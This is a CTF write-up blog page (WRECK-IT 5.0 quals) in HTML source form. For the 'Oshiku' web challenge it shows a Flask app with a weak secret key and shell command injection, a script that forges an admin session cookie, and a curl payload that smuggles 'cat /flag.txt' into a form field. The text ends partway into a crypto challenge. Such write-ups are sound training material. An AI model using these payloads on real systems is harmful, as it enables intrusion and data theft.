@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="google-site-verification" content="U_B1jdtQCOwQGpzsEzUxEoYku8m2HHBoc3UsVBbcFlk" />
+        <meta name="robots" content="noodp" />
+        <title>WRECK-IT 5.0 CTF Quals Writeup - whyuhurtz&#39;s Blog</title><meta name="Description" content="I managed to solved 2 challenges, which are web and crypto."><meta property="og:url" content="http://localhost:1313/2025/08/wreck-it-5.0-ctf-quals-writeup/">
+  <meta property="og:site_name" content="whyuhurtz&#39;s Blog">
+  <meta property="og:title" content="WRECK-IT 5.0 CTF Quals Writeup">
+  <meta property="og:description" content="I managed to solved 2 challenges, which are web and crypto.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-08-22T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="National">
+    <meta property="article:tag" content="Crypto">
+    <meta property="article:tag" content="Web Exploit">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="WRECK-IT 5.0 CTF Quals Writeup">
+  <meta name="twitter:description" content="I managed to solved 2 challenges, which are web and crypto.">
+<meta name="application-name" content="whyuhurtz&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="whyuhurtz&#39;s Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/2025/08/wreck-it-5.0-ctf-quals-writeup/" /><link rel="prev" href="http://localhost:1313/2025/06/install-ubuntu-gnome-from-scratch-using-debootstrap/" /><link rel="next" href="http://localhost:1313/2025/10/pdf-kmipn-vii-ctf-finals-writeup/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "WRECK-IT 5.0 CTF Quals Writeup",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/2025\/08\/wreck-it-5.0-ctf-quals-writeup\/"
+        },"genre": "posts","keywords": "ctf, national, crypto, web exploit","wordcount":  1218 ,
+        "url": "http:\/\/localhost:1313\/2025\/08\/wreck-it-5.0-ctf-quals-writeup\/","datePublished": "2025-08-22T00:00:00+00:00","dateModified": "2025-08-22T00:00:00+00:00","license": "\u0026copy; 2023-2025","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "whyuhurtz"
+            },"description": "I managed to solved 2 challenges, which are web and crypto."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/achievements/"> Achievements </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/achievements/" title="">Achievements</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">WRECK-IT 5.0 CTF Quals Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/whyuhurtz" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>whyuhurtz</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-08-22">2025-08-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1218 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#free-flag">Free Flag</a>
+          <ul>
+            <li><a href="#deskripsi">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian">Langkah Penyelesaian</a></li>
+            <li><a href="#flag">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#oshiku">Oshiku</a>
+          <ul>
+            <li><a href="#deskripsi-1">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian-1">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-1">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#m4k-c0mbl4n6">m4k c0MbL4n6</a>
+          <ul>
+            <li><a href="#deskripsi-2">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian-2">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-2">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content">I managed to solved 2 challenges, which are web and crypto.
+<h1 id="misc">Misc</h1>
+<h2 id="free-flag">Free Flag</h2>
+<h3 id="deskripsi">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>WRECKIT50{just_ch3cking_f0r_y0ur_sani7y}</strong></div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian">Langkah Penyelesaian</h3>
+<ul>
+<li>Flag gratis untuk permulaan dan sudah tertera di challenge description. Jadi, tinggal masukan saja flagnya.</li>
+</ul>
+<h3 id="flag">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>WRECKIT50{just_ch3cking_f0r_y0ur_sani7y}</strong></div>
+        </div>
+    </div>
+<hr>
+<h1 id="web">Web</h1>
+<h2 id="oshiku">Oshiku</h2>
+<h3 id="deskripsi-1">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Challenge Sederhana. iya kan?</p>
+<p>137.184.250.54:7012</p>
+<p>mirror : 146.190.104.208:7012</p>
+<p>Author: ZeroEXP</p>
+</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian-1">Langkah Penyelesaian</h3>
+<ul>
+<li>Diberikan sebuah file <code>dist.rar</code>, yang setelah diekstrak muncul 2 file berupa aplikasi Flask: <code>app.py</code> &amp; <code>database.db</code> . Berikut adalah source code ke-2 file tersebut.</li>
+</ul>
+<p><code>app.py</code></p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sqlite3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;os.urandom(8)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Database connection</span>
+</span></span><span class="line"><span class="cl"><span class="n">DATABASE</span> <span class="o">=</span> <span class="s2">&#34;database.db&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">query_database</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">query</span> <span class="o">=</span> <span class="s1">&#39;sqlite3 database.db &#34;SELECT biography FROM oshi WHERE name=</span><span class="se">\&#39;</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">+</span><span class="s1">&#39;</span><span class="se">\&#39;\&#34;</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">role</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;role&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">role</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">role</span> <span class="o">==</span> <span class="s2">&#34;guest&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;guest&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/login&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;username&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="s2">&#34;guest&#34;</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="s2">&#34;guest&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;guest&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;guest&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;msg&#34;</span><span class="p">:</span> <span class="s2">&#34;Bad username or password&#34;</span><span class="p">}),</span> <span class="mi">401</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;login.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/admin&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;role&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span> <span class="ow">or</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;msg&#34;</span><span class="p">:</span> <span class="s2">&#34;Access forbidden: Admins only&#34;</span><span class="p">}),</span> <span class="mi">403</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">selected_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;oshi_name&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">biography</span> <span class="o">=</span> <span class="n">query_database</span><span class="p">(</span><span class="n">selected_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;admin.html&#34;</span><span class="p">,</span> <span class="n">biography</span><span class="o">=</span><span class="n">biography</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;admin.html&#34;</span><span class="p">,</span> <span class="n">biography</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/guest&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">guest</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;role&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span> <span class="ow">or</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;guest&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;msg&#34;</span><span class="p">:</span> <span class="s2">&#34;Access forbidden: Guests only&#34;</span><span class="p">}),</span> <span class="mi">403</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;guest.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/logout&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;role&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><code>database.py</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">��</span><span class="n">g</span><span class="s1">&#39;&#39;</span><span class="err">�</span><span class="n">ormat</span> <span class="mi">3</span><span class="n">t</span><span class="p">]</span><span class="s1">&#39;&#39;</span><span class="n">wtablecyberIwtableoshioshiCREATE</span> <span class="n">TABLE</span> <span class="s2">&#34;oshi&#34;</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;name&#34;</span> <span class="n">TEXT</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;biography&#34;</span> <span class="n">TEXT</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="c1"># ...omitted...</span></span></span></code></pre></div></div>
+<ul>
+<li>Awal saya analisis file <code>app.py</code>, saya menyadari bahwa secret_key yang digunakan adalah berupa string biasa / tidak random (<em>weak secret key</em>). Dari situ, saya langsung craft python script untuk men-generate sebuah JWT token agar bisa login sebagai admin dengan memanfaatkan <code>role=”admin”</code>. Berikut adalah kodenya.</li>
+</ul>
+<p><code>gen_session_cookie.py</code></p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># GENERATE ADMIN SESSION COOKIE USING WEAK SECRET KEY!</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask.sessions</span> <span class="kn">import</span> <span class="n">SecureCookieSessionInterface</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itsdangerous</span> <span class="kn">import</span> <span class="n">URLSafeTimedSerializer</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Fungsi untuk membuat sesi palsu</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_session</span><span class="p">(</span><span class="n">secret_key</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">session_interface</span> <span class="o">=</span> <span class="n">SecureCookieSessionInterface</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="n">serializer</span> <span class="o">=</span> <span class="n">URLSafeTimedSerializer</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secret_key</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">salt</span><span class="o">=</span><span class="s1">&#39;cookie-session&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">signer_kwargs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;key_derivation&#39;</span><span class="p">:</span> <span class="s1">&#39;hmac&#39;</span><span class="p">,</span> <span class="s1">&#39;digest_method&#39;</span><span class="p">:</span> <span class="s1">&#39;sha1&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">serializer</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># URL target</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://146.190.104.208:7012&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Buat sesi palsu</span>
+</span></span><span class="line"><span class="cl"><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;os.urandom(8)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">session_data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;role&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_session</span> <span class="o">=</span> <span class="n">create_session</span><span class="p">(</span><span class="n">secret_key</span><span class="p">,</span> <span class="n">session_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">fake_session</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/wreckit5.0_web1-01.png"
+        data-srcset="/images/wreckit5.0_web1-01.png, /images/wreckit5.0_web1-01.png 1.5x, /images/wreckit5.0_web1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/wreckit5.0_web1-01.png"
+        title="Oshiku-01" width="792" height="341" /></p>
+<ul>
+<li>Setelah berhasil login sebagai admin, saya coba baca lagi source code flask-nya. Awalnya, saya berpikir jika di fungsi <code>query_database</code> adalah kerentanan <em>SQL Injection</em>, tapi ternyata saya salah. Itu merupakan kerentanan <em><strong>Command Injection</strong></em>. Langsung saja saya craft payloadnya dan coba kirim request tersebut via cURL menggunakan cookie admin yang sudah di-generate sebelumnya.</li>
+<li>Berikut adalah POC untuk get flag-nya:</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Filename: solver.sh</span>
+</span></span><span class="line"><span class="cl">curl -X POST -d <span class="s2">&#34;oshi_name=freya\&#34;; cat /flag.txt; echo #&#34;</span> --cookie <span class="s2">&#34;session=eyJyb2xlIjoiYWRtaW4ifQ.ZrbXaQ.9CjlFr995lsT5RjKbe9D_6t4kMg&#34;</span> http://146.190.104.208:7012/admin</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/wreckit5.0_web1-02.png"
+        data-srcset="/images/wreckit5.0_web1-02.png, /images/wreckit5.0_web1-02.png 1.5x, /images/wreckit5.0_web1-02.png 2x"
+        data-sizes="auto"
+        alt="/images/wreckit5.0_web1-02.png"
+        title="Oshiku-02" width="862" height="437" /></p>
+<h3 id="flag-1">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>WRECKIT50{oshikucumansatukok_satujkt}</strong></div>
+        </div>
+    </div>
+<hr>
+<h1 id="crypto">Crypto</h1>
+<h2 id="m4k-c0mbl4n6">m4k c0MbL4n6</h2>
+<h3 id="deskripsi-2">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>aku lagi jomblo. tolong carikan aku jodoh</p>
+<p>Thanks to hash designer &amp; attacker: @hakim01a (IG) &amp; @yudik_suta (IG)</p>
+<p>Connected to : nc 188.166.247.108 6969</p>
+<p>alt: nc 13.212.238.29 6969</p>
+<p>Author : ac3</p>
+</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian-2">Langkah Penyelesaian</h3>
+<ul>
+<li>Diberikan 2 file, yaitu <code>propietary.py</code> dan <code>chall.py</code> .</li>
+</ul>
+<p><code>propietary.py</code></p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
